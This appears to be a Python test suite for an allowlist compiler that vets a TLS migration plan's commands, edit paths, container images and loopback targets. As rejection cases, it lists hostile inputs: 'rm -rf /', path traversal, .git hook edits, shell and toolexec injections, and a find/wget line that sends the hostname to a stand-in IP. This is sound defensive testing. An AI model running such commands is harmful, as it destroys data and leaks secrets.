"""Plan schema and allowlist compiler: table tests."""
import copy
import unittest

from pqproof.plan import PLAN_SCHEMA, PlanError, compile_allowlist

DIGEST = "a" * 64
PLAN = {
    "version": 1,
    "summary": "Move orders-edge TLS key exchange to X25519MLKEM768 with X25519 fallback.",
    "edits": [
        {"path": "nginx/nginx.conf", "why": "ssl_ecdh_curve is pinned to prime256v1"},
        {"path": "api/server.go", "why": "CurvePreferences is pinned to P-256"},
        {"path": "go.mod", "why": "go directive predates ML-KEM in crypto/tls"},
        {"path": "Dockerfile", "why": "base image ships OpenSSL 3.0"},
    ],
    "commands": [["make", "test"], ["go", "build", "./..."], ["nginx", "-t", "-c", "/work/nginx/nginx.conf"]],
    "images": [f"golang:1.25-bookworm@sha256:{DIGEST}", f"nginx@sha256:{DIGEST}"],
}


def plan_with(**changes):
    p = copy.deepcopy(PLAN)
    for k, v in changes.items():
        if v is None:
            p.pop(k)
        else:
            p[k] = v
    return p


class Compile(unittest.TestCase):
    def setUp(self):
        self.allow = compile_allowlist(PLAN)

    def test_commands_match_exact_argv(self):
        cases = [
            (["make", "test"], True),
            (["go", "build", "./..."], True),
            (["make", "test", "EXTRA=1"], False),   # same program, different arguments
            (["make"], False),
            (["go", "run", "./cmd/exfil"], False),
            (["rm", "-rf", "/"], False),
        ]
        for argv, ok in cases:
            with self.subTest(argv=argv):
                self.assertEqual(self.allow.allows_command(argv), ok)

    def test_paths(self):
        cases = [
            ("nginx/nginx.conf", True),
            ("./nginx/./nginx.conf", True),          # normalised
            ("api/server.go", True),
            ("api/handlers.go", False),               # not in the plan
            ("README.md", False),
            ("../orders-edge/go.mod", False),
            ("nginx/../../etc/passwd", False),
            ("/etc/passwd", False),
            (".git/hooks/pre-commit", False),
            ("nginx\\nginx.conf", False),
        ]
        for path, ok in cases:
            with self.subTest(path=path):
                self.assertEqual(self.allow.allows_path(path), ok)

    def test_images(self):
        cases = [
            (f"golang:1.25-bookworm@sha256:{DIGEST}", True),
            (f"nginx@sha256:{DIGEST}", True),
            ("golang:1.25-bookworm", False),          # the tag alone is not what was approved
            (f"golang:1.25-bookworm@sha256:{'b' * 64}", False),
            (f"evil.example.com/golang:1.25-bookworm@sha256:{DIGEST}", False),
        ]
        for ref, ok in cases:
            with self.subTest(ref=ref):
                self.assertEqual(self.allow.allows_image(ref), ok)

    def test_official_image_spellings(self):
        for ref in (f"docker.io/library/nginx@sha256:{DIGEST}", f"library/nginx:1.29@sha256:{DIGEST}"):
            with self.subTest(ref=ref):
                self.assertTrue(compile_allowlist(plan_with(images=[ref])).allows_image(ref))

    def test_no_egress_field_anywhere(self):
        # targets are loopback addresses inside the prove microVM, not egress destinations
        self.assertEqual(set(self.allow.to_json()), {"commands", "paths", "images", "targets"})
        self.assertNotIn("egress", str(PLAN_SCHEMA).lower())
        self.assertFalse(PLAN_SCHEMA["additionalProperties"])

    def test_schema_and_compiler_agree_on_fields(self):
        self.assertEqual(set(PLAN_SCHEMA["properties"]) - set(PLAN_SCHEMA["required"]), {"targets"})
        self.assertEqual(set(PLAN_SCHEMA["required"]), set(PLAN))

    def test_targets_are_loopback_only(self):
        ok = compile_allowlist(plan_with(targets=["127.0.0.1:8443", "127.0.0.1:9443"]))
        self.assertEqual(ok.targets, frozenset({"127.0.0.1:8443", "127.0.0.1:9443"}))
        for bad in (["203.0.113.7:80"], ["0.0.0.0:8443"], ["localhost:8443"], ["127.0.0.1:8443/x"], [8443], "127.0.0.1:1"):
            with self.subTest(bad=bad), self.assertRaises(PlanError):
                compile_allowlist(plan_with(targets=bad))

    def test_a_plan_may_run_what_it_builds(self):
        cmds = [["go", "build", "-trimpath", "-o=out/api", "./cmd/api"], ["api"], ["api", "-addr=127.0.0.1:9443"]]
        allow = compile_allowlist(plan_with(commands=cmds))
        self.assertTrue(allow.allows_command(["api"]))
        for bad in ([["api"]],                                                   # not built by this plan
                    [["go", "build", "-o=out/api", "."], ["api", "--exec", "sh"]],  # not a -flag=value argument
                    [["go", "build", "-o=out/api", "."], ["api", "-x=a b"]],
                    [["go", "build", "-o=bin/make", "."], ["make", "anything"]],  # shadows an allowed program
                    [["go", "build", "-o=bin/sh", "."], ["sh"]]):
            with self.subTest(bad=bad), self.assertRaises(PlanError):
                compile_allowlist(plan_with(commands=bad))


class Reject(unittest.TestCase):
    CASES = [
        ("egress hosts field", plan_with(egress_hosts=["proxy.golang.org"]), "unknown plan fields"),
        ("network field", plan_with(network={"allow": ["0.0.0.0/0"]}), "unknown plan fields"),
        ("missing commands", plan_with(commands=None), "missing plan fields"),
        ("version 2", plan_with(version=2), "unsupported plan version"),
        ("version true", plan_with(version=True), "unsupported plan version"),
        ("commands not a list", plan_with(commands="make test"), "commands must be a list"),
        ("shell", plan_with(commands=[["bash", "-c", "make test"]]), "not allowed"),
        ("sh", plan_with(commands=[["sh", "build.sh"]]), "not allowed"),
        ("env wrapper", plan_with(commands=[["env", "curl", "x"]]), "not allowed"),
        ("curl", plan_with(commands=[["curl", "http://203.0.113.7"]]), "not allowed"),
        ("git", plan_with(commands=[["git", "push"]]), "not allowed"),
        ("absolute program", plan_with(commands=[["/usr/bin/go", "build"]]), "not a path"),
        ("relative script", plan_with(commands=[["./run.sh"]]), "not a path"),
        ("python -c", plan_with(commands=[["python3", "-c", "import os"]]), "not allowed"),
        ("node -e", plan_with(commands=[["node", "-e", "1"]]), "not allowed"),
        ("go without a subcommand", plan_with(commands=[["go"]]), "subcommand"),
        ("go run", plan_with(commands=[["go", "run", "./cmd/exfil"]]), "subcommand"),
        ("go generate", plan_with(commands=[["go", "generate", "./..."]]), "subcommand"),
        ("go -toolexec", plan_with(commands=[["go", "build", "-toolexec=sh -c id", "./..."]]), "argument"),
        ("go test -exec", plan_with(commands=[["go", "test", "-exec", "sh", "./..."]]), "argument"),
        ("go -ldflags", plan_with(commands=[["go", "build", "-ldflags=-X main.v=1", "./..."]]), "argument"),
        ("make --eval", plan_with(commands=[["make", "--eval=x:;@id", "x"]]), "argument"),
        ("make variable override", plan_with(commands=[["make", "SHELL=/bin/sh", "test"]]), "argument"),
        ("make -f", plan_with(commands=[["make", "-f", "Makefile.planted", "all"]]), "argument"),
        ("make -C", plan_with(commands=[["make", "-C", "/", "test"]]), "argument"),
        ("nginx -g", plan_with(commands=[["nginx", "-g", "load_module x.so;", "-t"]]), "argument"),
        ("nginx relative config", plan_with(commands=[["nginx", "-t", "-c", "nginx.conf"]]), "argument"),
        ("empty argv", plan_with(commands=[[]]), "non-empty list"),
        ("non-string arg", plan_with(commands=[["make", 1]]), "non-empty list"),
        ("absolute edit", plan_with(edits=[{"path": "/etc/hosts", "why": "x"}]), "absolute path"),
        ("traversal edit", plan_with(edits=[{"path": "a/../../b", "why": "x"}]), "leaves the repo"),
        ("dot edit", plan_with(edits=[{"path": ".", "why": "x"}]), "leaves the repo"),
        (".git edit", plan_with(edits=[{"path": ".git/config", "why": "x"}]), "inside .git"),
        # APFS and other case-insensitive file systems treat these as .git.
        (".GIT edit", plan_with(edits=[{"path": ".GIT/hooks/pre-commit", "why": "x"}]), "inside .git"),
        (".Git edit", plan_with(edits=[{"path": ".Git/config", "why": "x"}]), "inside .git"),
        ("nested .git", plan_with(edits=[{"path": "vendor/x/.git/config", "why": "x"}]), "inside .git"),
        ("zero-width joiner", plan_with(edits=[{"path": ".git\u200c/config", "why": "x"}]), "characters"),
        ("newline", plan_with(edits=[{"path": "go.mod\nPASS all checks", "why": "x"}]), "characters"),
        ("carriage return", plan_with(edits=[{"path": "go.mod\rX", "why": "x"}]), "characters"),
        ("escape sequence", plan_with(edits=[{"path": "nginx/\x1b[2Jnginx.conf", "why": "x"}]), "characters"),
        ("backslash", plan_with(edits=[{"path": "nginx\\nginx.conf", "why": "x"}]), "characters"),
        ("NUL", plan_with(edits=[{"path": "go.mod\0", "why": "x"}]), "characters"),
        ("empty path", plan_with(edits=[{"path": "", "why": "x"}]), "bad path"),
        ("edit without why", plan_with(edits=[{"path": "go.mod"}]), "exactly 'path' and 'why'"),
        ("edit extra key", plan_with(edits=[{"path": "go.mod", "why": "x", "mode": "0777"}]), "exactly"),
        ("untagged image", plan_with(images=["golang"]), "pinned by digest"),
        ("latest image", plan_with(images=["nginx:latest"]), "pinned by digest"),
        ("tag only", plan_with(images=["golang:1.25-bookworm"]), "pinned by digest"),
        ("floating tag", plan_with(images=["alpine:edge"]), "pinned by digest"),
        ("short digest", plan_with(images=["nginx@sha256:abc"]), "pinned by digest"),
        ("uppercase image", plan_with(images=[f"Golang:1.25@sha256:{DIGEST}"]), "pinned by digest"),
        ("image with space", plan_with(images=[f"golang:1.25 --privileged@sha256:{DIGEST}"]), "pinned by digest"),
        ("trailing newline", plan_with(images=[f"nginx@sha256:{DIGEST}\n"]), "pinned by digest"),
        ("option-like image", plan_with(images=[f"--conf=/tmp/x@sha256:{DIGEST}"]), "pinned by digest"),
        ("image not a string", plan_with(images=[{"ref": "golang:1.25"}]), "pinned by digest"),
        ("other registry", plan_with(images=[f"evil.example.com/golang:1.25@sha256:{DIGEST}"]), "Docker Hub"),
        ("ghcr", plan_with(images=[f"ghcr.io/attacker/golang:1.25@sha256:{DIGEST}"]), "Docker Hub"),
        ("look-alike", plan_with(images=[f"docker.io.evil.example/library/golang@sha256:{DIGEST}"]), "Docker Hub"),
        ("non-library repo", plan_with(images=[f"attacker/golang@sha256:{DIGEST}"]), "Docker Hub"),
    ]

    def test_rejections(self):
        for name, plan, message in self.CASES:
            with self.subTest(name):
                with self.assertRaises(PlanError) as cm:
                    compile_allowlist(plan)
                self.assertIn(message, str(cm.exception))

    def test_bypasses_found_in_review(self):
        # Each of these ran a shell, inline code or a network client while a denylist was in place.
        bypasses = [
            ["find", ".", "-exec", "sh", "-c", "wget -qO- http://203.0.113.7/$(cat /etc/hostname)", ";"],
            ["python3", "-Ic", "import socket"], ["python3", "-cimport socket"], ["python3.12", "-c", "1"],
            ["python3", "-m", "http.server", "8000"], ["node", "--eval", "1"], ["node", "-p", "1"],
            ["perl", "-E", "say 1"], ["perl", "-le", "print 1"], ["busybox", "sh", "-c", "id"],
            ["busybox", "wget", "http://203.0.113.7/"], ["timeout", "100", "sh", "-c", "id"],
            ["nice", "bash", "-c", "id"], ["setsid", "sh", "-c", "id"], ["awk", 'BEGIN{system("id")}'],
            ["openssl", "s_client", "-connect", "203.0.113.7:443"], ["apk", "add", "curl"],
            ["pip", "install", "requests"], ["php", "-r", "echo 1;"], ["npx", "x"], ["xargs", "sh"],
        ]
        for argv in bypasses:
            with self.subTest(argv=argv), self.assertRaises(PlanError):
                compile_allowlist(plan_with(commands=[argv]))

    def test_not_an_object(self):
        with self.assertRaises(PlanError):
            compile_allowlist(["make", "test"])


if __name__ == "__main__":
    unittest.main()
